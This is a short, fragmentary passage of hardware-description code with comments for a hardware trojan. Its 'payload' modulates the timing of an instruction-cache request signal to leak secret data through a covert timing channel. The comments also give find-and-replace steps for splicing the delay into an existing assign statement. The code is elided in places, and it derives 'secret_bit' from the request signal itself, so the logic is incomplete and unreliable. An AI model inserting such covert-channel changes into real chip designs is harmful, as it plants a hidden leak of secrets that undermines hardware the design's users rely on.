 ...
 * Payload: Modulate timing of icache_mem_data_req based on secret data
 * 
...
assign secret_bit = icache_mem_data_req[0];
...
// ============================================================
// Covert Channel: Modulate timing of icache_mem_data_req
//
// Integration Script Must Modify:
//
// IF icache_mem_data_req is timing-sensitive:
//   Find: assign icache_mem_data_req = ready_signal;
//   Replace: assign icache_mem_data_req = (timing_delay == 0) ? ready_signal : 1'b0;
//
